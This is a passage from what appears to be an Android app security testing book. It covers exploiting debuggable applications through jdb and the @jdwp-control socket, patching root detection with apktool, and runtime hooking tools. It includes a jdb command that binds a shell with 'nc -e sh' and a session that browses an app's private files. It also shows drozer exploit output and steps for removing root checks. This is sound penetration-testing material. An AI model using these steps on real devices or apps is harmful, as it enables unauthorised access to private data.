runtime.
$ adb forward tcp:4444 jdwp:5147
After this connection has been forwarded, use jdb to connect to it:
$ jdb -attach localhost:4444
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
>
At this point, you can control the flow of execution and manipulate the application in any way you please. In
general, the reason an attacker would want to exploit a debuggable application would be to get to the files being
protected by it. One of the most simple and reliable methods for running operating system commands as the
debuggable application from within jdb was explained by Jay Freeman on his blog at
http://www.saurik.com/id/17. The general steps to use his method are as follows:
1. List all threads in the application.
> threads
Group system:
(java.lang.Thread)0xc1b1db5408  FinalizerWatchdogDaemon cond. waiting
(java.lang.Thread)0xc1b1db5258  FinalizerDaemon cond. waiting
(java.lang.Thread)0xc1b1db50f0  ReferenceQueueDaemon cond. waiting
(java.lang.Thread)0xc1b1db5000  Compiler cond. waiting
(java.lang.Thread)0xc1b1db4e20  Signal Catcher cond. waiting
(java.lang.Thread)0xc1b1db4d40  GC cond. waiting
Group main:
(java.lang.Thread)0xc1b1addca8  main running
(java.lang.Thread)0xc1b1db8bc8  Binder_2 running
(java.lang.Thread)0xc1b1db8ad8  Binder_1 running
>
2. Find the main thread and attach to it.
> thread 0xc1b1addca8
 main[1]
3. Suspend the thread.
 main[1] suspend
All threads suspended.
4. Create a breakpoint on android.os.MessageQueue.next.
 main[1] stop in android.os.MessageQueue.next
Set breakpoint android.os.MessageQueue.next
5. Run and cause the breakpoint to hit.
 main[1] run
>
Breakpoint hit: "thread= main", android.os.MessageQueue.next(), line=
129 bci=0
The breakpoint should immediately occur. If it does not, then you can cause it by interacting with the
application in any way. Execute any operating system command:
 main[1] print new java.lang.Runtime().exec("/data/local/tmp/busybox
nc -l -p 6666 -e sh -i")
new java.lang.Runtime().exec("/data/local/tmp/busybox nc -l -p 6666 -e
sh -i") = "Process[pid=5853]"
In this case prior to exploitation a busybox binary was uploaded to /data/local/tmp and made accessible to all
applications. We then invoked it to run the nc utility that binds a shell to TCP port 6666. To interact with this
shell you forward TCP port 6666 to the attached computer and then use nc on the computer. The following
shows these steps along with proof that access to the Sieve files has been obtained:
$ adb forward tcp:6666 tcp:6666
$ nc localhost 6666
sh: can't find tty fd: No such device or address
sh: warning: won't have full job control
u0_a53@generic:/ $ cd /data/data/com.mwr.example.sieve
u0_a53@generic:/data/data/com.mwr.example.sieve $ ls -l
drwxrwx--x u0_a53 u0_a53 2014-05-27 08:48 cache
drwxrwx--x u0_a53 u0_a53 2014-05-27 08:48 databases
lrwxrwxrwx install install 2014-05-25 07:11 lib -> /data/app-
lib/com.mwr.example.sieve-1
EXPLOITING DEBUGGABLE APPLICATIONS FROM ANOTHER APPLICATION WITH NO
PERMISSIONS
In 2011, Nils from MWR InfoSecurity identified a vulnerability in the way that debuggable applications
verify the debugger that they connect to. Applications that are marked as debuggable are always looking
for a UNIX domain socket named @jdwp-control. If this socket is found, an application connects to it and
provides debugging rights to the application that owns this socket. However, it was found that any
application could open this socket and act as a debugger to all debuggable applications on the device.
Timing indicates that this issue was present on all Android versions 3.1 and earlier. See the discussion of
this issue at https://labs.mwrinfosecurity.com/blog/2011/07/07/debuggable-apps-in-android-market/.
As a proof of concept for checking this issue on a device running Android 2.3, you can use the
exploit.jdwp.check module in drozer. Start this module and then open a debuggable application, such as
Sieve, as shown here:
dz> run exploit.jdwp.check
[+] Opened @jdwp-control
[*] Accepting connections
[+] com.mwr.dz connected!
[+] Received PID = 3941
[+] This device is vulnerable!
[+] com.mwr.dz connected!
[+] Received PID = 3950
[+] This device is vulnerable!
[+] com.mwr.example.sieve connected!
[+] Received PID = 4003
[+] This device is vulnerable!
[+] com.mwr.example.sieve connected!
[+] Received PID = 4011
[+] This device is vulnerable!
These applications connect to your socket and start the transaction required to hand over debugging rights
to drozer. These applications connect because they are both debuggable and both have some running
processes belonging to them. Both of these conditions must be met in order to get a connection. To
understand the reason why the drozer agent and Sieve connected twice, observe the output of ps of these
two applications:
app_109 3941 2718 148048 23904 ffffffff afd0c59c S com.mwr.dz
app_109 3950 2718 152324 22448 ffffffff afd0c59c S com.mwr.dz:remote
app_115 4003 2718 142656 20116 ffffffff 00000000 S com.mwr.example.
sieve
app_115 4011 2718 141024 15760 ffffffff 00000000 S com.mwr.example.
sieve:remote
These applications connected twice because they both have two separate processes running that
connected. Running the same test on an Android 4.0.4 device reveals the following:
dz> run exploit.jdwp.check
[+] Opened @jdwp-control
[*] Accepting connections
[+] com.mwr.dz connected!
[-] Did not receive PID...not vulnerable?
[+] com.mwr.dz connected!
[-] Did not receive PID...not vulnerable?
[+] com.mwr.example.sieve connected!
[-] Did not receive PID...not vulnerable?
[+] com.mwr.example.sieve connected!
[-] Did not receive PID...not vulnerable?
This shows that the processes still connected to the socket but terminated the connection when trying to
interact with the connection. This happened because to fix this vulnerability, code was submitted that adds
a check after a debuggable application connects to the @jdwp-control socket and tries to send it data. This
check is contained in a function called socket_peer_is_trusted(), which returns a boolean value stating
whether the @jdwp-control socket was created by the shell or root user. In this instance, drozer would
not be running as either of these users and so the application terminated the connection. This fix was
made in the commit found at
https://android.googlesource.com/platform/dalvik/+/d53c7efac74f2c690a86871f160a0f36fbc069ef.
Additional Testing Techniques
This section provides an overview of testing techniques and tools that you can use when tricky testing scenarios
arise. Applications that have implemented layered security measures can be very difficult to test properly
because these mechanisms stand in the way. Two examples of such situations are:
Certificate pinned connections—Having applications that “pin” their SSL connections to a specific
certificate is becoming more and more prevalent. Various ways exist to do this with one way being to
perform a full match of the presented server certificate against a stored one that was bundled with the
application. This presents a problem if you need to proxy the application traffic and assess the security of the
underlying web service.
Root detection—This performs checks at various points in the application code that the application is not
running inside an emulator or on a rooted device. Running an application on a non-rooted device may not
allow you to test every aspect of the application; for example, the file permissions of the files inside the
application’s private data directory.
This section presents some scenarios that may arise and solutions that let you thoroughly test an application.
Patching Applications
One way to disable SSL certificate-pinned connections and root detection could be to disassemble the
application, remove these features from the code, and then assemble the application again. One of the easiest
tools to use to support this activity is apktool; Chapter 6 presents an overview of it. This method relies on a
moderate level of knowledge of the smali format. A simple “Hello World” example is provided at
https://code.google.com/p/smali/source/browse/examples/HelloWorld/HelloWorld.smali and is shown here:
.class public LHelloWorld;
.super Ljava/lang/Object;
.method public static main([Ljava/lang/String;)V
.registers 2
sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;
const-string v1, "Hello World!"
invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/
String;)V
return-void
.end method
To become comfortable with smali, it is useful to look at the Java code that represents a smali function being
examined. This will be left as an exercise for the reader as becoming comfortable with smali is a matter of
practicing and spending time with it.
Take an example of an application from the Play Store that checks and displays whether a device is rooted or
not. You can attempt to patch it so that it always says the device is not rooted. The checks performed in this
application will be roughly equivalent to what you would commonly find in an application with root detection
code. You may use the Root Checker application (see https://play.google.com/store/apps/details?
id=com.joeykrim.rootcheck&hl=en) for this example. Figure 7.16 shows running Root Checker on a rooted
device.
Figure 7.16 Root Checker displaying that the device is rooted
Performing this patching exercise on the Root Checker application involves using apktool to convert the
application back to smali code, searching for the functions that check for the “su” binary, and modifying them to
fail the root check. Note that this exercise is only for testing purposes and the application will have a completely
different cryptographic signature after the code has been modified and assembled again.
You can use the following command-line parameters with apktool to “baksmali” this application:
$ java -jar apktool.jar d com.joeykrim.rootcheck.apk rootcheck
I: Baksmaling...
I: Loading resource table...
I: Loaded.
I: Decoding AndroidManifest.xml with resources...
I: Loading resource table from file: /home/mahh/apktool/framework/1.apk
I: Loaded.
I: Regular manifest package...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Done.
I: Copying assets and libs...
Now you can search for any string containing su using grep on the smali code:
$ grep -R -i "\"su\"" rootcheck
rootcheck/smali/com/a/a/aa.smali: const-string v7, "su"
rootcheck/smali/com/joeykrim/rootcheck/t.smali: const-string v1, "su"
Using dex2jar and viewing the code in JD-GUI reveals that the code is heavily obfuscated. Here is the
decompiled Java code that relates to com/joeykrim/rootcheck/t.smali:
package com.joeykrim.rootcheck;
public final class t
{
public v a = new v(this, "sh");
public v b = new v(this, "su");
}
This is quite cryptic and hard to understand without doing further analysis. However, you may assume that it is
trying to do something with the “su” binary on the device, such as execute it or check if it is on the PATH. Maybe
if you change the “su” string in this function to “nonexistent” then it will try to check or execute “nonexistent”
and this check will fail. You can assemble the modified contents back to an APK by using apktool again:
$ java -jar apktool.jar b rootcheck/ rootcheck-modified.apk
I: Checking whether sources has changed...
I: Smaling...
I: Checking whether resources has changed...
I: Building resources...
I: Building apk file...
You must use the same signing procedure as described in Chapter 6 to sign the APK so that it can be installed on
a device:
$ jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore
mykey.keystore rootcheck-modified.apk alias_name
Enter Passphrase for keystore:
adding: META-INF/MANIFEST.MF
adding: META-INF/ALIAS_NA.SF
adding: META-INF/ALIAS_NA.RSA
signing: res/color/common_signin_btn_text_dark.xml
...
signing: AndroidManifest.xml
signing: classes.dex
signing: resources.arsc
ERRORS SIGNING A PACKAGE
The correct version of jarsigner to use for signing Android applications is 1.6. Using any other version
may result in error messages about incorrect certificates inside the package from the PackageParser when
installing it.
The default version of jarsigner that the system uses can be changed by performing the following
command and then selecting the correct version contained in JDK 1.6:
$ sudo update-alternatives --config jarsigner
After installing the patched application and starting it, you should see that your patch worked. Figure 7.17 shows
that the application no longer says that the device is rooted.
Figure 7.17 Root Checker now displaying that the device is not rooted
This was a simple example of how to patch an application to bypass certain conditions when testing and does
not constitute a vulnerability in the Root Checker application. When cross-platform frameworks like PhoneGap
(seehttp://phonegap.com/) are used, patching out functionality may even be easier because these checks are
performed in JavaScript that come with the application. You can use apktool to disassemble the APK and allow
you to change the JavaScript to suit your needs.
Manipulating the Runtime
Patching complicated functionality from an application can be time consuming and frustrating. However,
another way exists that may be less time consuming and allow greater flexibility when testing. The concept of
runtime manipulation will be very familiar to iOS hackers. On Android, this concept may not be as important for
assessing application security. However, there are some distinct advantages to using tools that perform runtime
patching of applications. These tools allow the use of low-level hooks when classes and methods are loaded.
This means that patching the Root Checker application could have been done on the fly in memory while the
application was running by writing an add-on for a runtime manipulation tool.
Two tools stand out in this space: Cydia Substrate by Jay Freeman and Xposed Framework by rovo89 (a user of
the XDA Developers forum). Some typical use cases of when these tools are useful are also presented in this
section. A plethora of add-ons to these tools make testing of applications easier. You should explore a host of
these add-ons and build your own arsenal of tools that you feel are useful.
Tool: Xposed Framework
Xposed Framework was released in 2012 by a member of the XDA Developers forum named rovo89. Using root
privileges, it provides functionality for hooking and modifying Android applications at runtime. It has become a
very popular framework for the modding community, and an active community of developers is creating
modules that alter all kinds of system behavior attributes. You can download it from http://repo.xposed.info/;
the community forum is hosted at http://forum.xda-developers.com/xposed. The repository at
http://repo.xposed.info/module-overview contains modules that can change the look and feel of the device in
some way and there are some modules that may be useful for the testing of applications as well. Xposed works
by providing a custom app_process binary and therefore can only modify code that is a forked from Zygote; for
example, installed applications. This means that anything that has not been forked from Zygote is not possible
to hook using Xposed, including native code.
Tool: Cydia Substrate
Cydia Substrate (previously known as Mobile Substrate) is a tool that was released in 2008 for Apple iOS
devices and became wildly popular in the jailbreaking community. Since then, a version for Android was
released in 2013 and is now available for download from the Play Store or from Jay Freeman’s website at
http://www.cydiasubstrate.com/. It comes in the form of an APK and it requires root privileges to function. The
Cydia Substrate application itself does not have any directly usable functionality. It merely provides the runtime
hooking and modification functionality to other applications (also known as “extensions”). The techniques used
for code injection are top notch, and in our opinion this tool is technically superior to the Xposed Framework. It
can provide arbitrary modification of anything running on an Android device (including native code). For any
runtime patching needs for security testing purposes, we recommend using Cydia Substrate.
Figure 7.18 shows the Cydia Substrate application installed and running on a rooted Android device.
Figure 7.18 The main activity of Cydia Substrate running on an Android device
Use Case: SSL Certificate Pinning
The Twitter (https://twitter.com/) application development team was an early adopter of SSL certificate
pinning techniques on Android. The Twitter application does not proxy through an intercepting proxy such as
Burp, even when the Burp CA certificate is installed on the device. This is expected behavior from a properly
certificate-pinned application.
When the application attempts to load tweets, a toast pops up saying, “Cannot retrieve Tweets at this time.
Please try again later.” This is well done from a security perspective because it does not give you any clues about